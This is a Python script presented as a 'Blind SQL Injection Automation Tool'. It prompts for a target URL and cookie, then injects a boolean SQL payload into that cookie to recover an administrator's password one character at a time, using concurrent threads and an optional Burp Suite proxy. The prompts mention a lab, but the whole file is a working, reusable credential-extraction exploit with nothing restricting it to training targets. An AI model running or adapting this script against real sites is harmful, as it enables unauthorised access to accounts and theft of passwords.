#!/usr/bin/env python3
import sys
import string
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def banner():
    print("""
    ====================================================================
               Blind SQL Injection Automation Tool (CLI)              
    ====================================================================
    [+] Creator   : M Haidar                              
    [+] LinkedIn  : https://www.linkedin.com/in/haidarobs            
    [+] GitHub    : https://github.com/mdhaidarobs                   
    ====================================================================
    """)

def main():
    banner()

    print("[*] Please provide the configuration details below (Typo-safe):\n")
    
    # URL Input with validation loop (No restart needed on typo)
    while True:
        url = input("Enter Target Lab URL (e.g., https://example.com/): ").strip()
        if url.startswith("http"):
            break
        print("[-] Error: URL must start with http:// or https://. Try again.\n")

    # Tracking ID validation loop
    while True:
        base_tracking_id = input("Enter your Base Tracking ID value: ").strip()
        if base_tracking_id:
            break
        print("[-] Error: Tracking ID cannot be empty. Try again.\n")

    cookie_name = input("Enter Cookie Name vulnerable to SQLi [Default: TrackingId]: ").strip()
    if not cookie_name:
        cookie_name = "TrackingId"

    other_cookies_input = input("Enter any other required cookies (format name=value; name2=value2) or leave blank: ").strip()
    
    target_user = input("Enter Username to target [Default: administrator]: ").strip()
    if not target_user:
        target_user = "administrator"

    # Password length validation loop
    while True:
        try:
            max_length = int(input("Enter expected password length (e.g., 20): ").strip())
            if max_length > 0:
                break
            print("[-] Length must be greater than 0.")
        except ValueError:
            print("[-] Error: Please enter a valid integer number.")

    # Proxy support for Burp Suite (Optional)
    use_proxy = input("Do you want to route traffic through Burp Suite proxy (127.0.0.1:8080)? (y/N): ").strip().lower()
    proxies = None
    if use_proxy == 'y':
        proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080'
        }
        print("[*] Proxy enabled: Traffic will route through Burp Suite.")

    # Parse extra cookies if provided
    cookies_dict = {}
    if other_cookies_input:
        for c in other_cookies_input.split(";"):
            if "=" in c:
                k, v = c.strip().split("=", 1)
                cookies_dict[k] = v

    characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
    
    print(f"\n[+] Starting multi-threaded enumeration for: '{target_user}' (Length: {max_length})")
    print("-" * 68)

    password = ""
    session = requests.Session() # Session pooling for speed

    def test_char(position, char):
        payload = f"{base_tracking_id}' and (select substring(password,{position},1) from users where username='{target_user}')='{char}'--"
        curr_cookies = cookies_dict.copy()
        curr_cookies[cookie_name] = payload
        try:
            response = session.get(
                url, 
                cookies=curr_cookies, 
                proxies=proxies, 
                verify=False, 
                timeout=10
            )
            if "Welcome back" in response.text:
                return char
        except Exception:
            pass
        return None

    # Loop through each position and test all characters concurrently using threads
    for position in range(1, max_length + 1):
        found_char = None
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(test_char, position, char): char for char in characters}
            for future in as_completed(futures):
                res = future.result()
                if res:
                    found_char = res
                    break # Found correct character, move to next position
        
        if found_char:
            password += found_char
            sys.stdout.write(f"\r[+] Progress: [{password}]")
            sys.stdout.flush()
        else:
            print(f"\n[-] Character not found at position {position}. Check your payload or length.")
            break

    print("\n" + "-" * 68)
    print(f"[+] Enumeration Complete!")
    print(f"[+] Password for '{target_user}' is: {password}")

if __name__ == "__main__":
    main()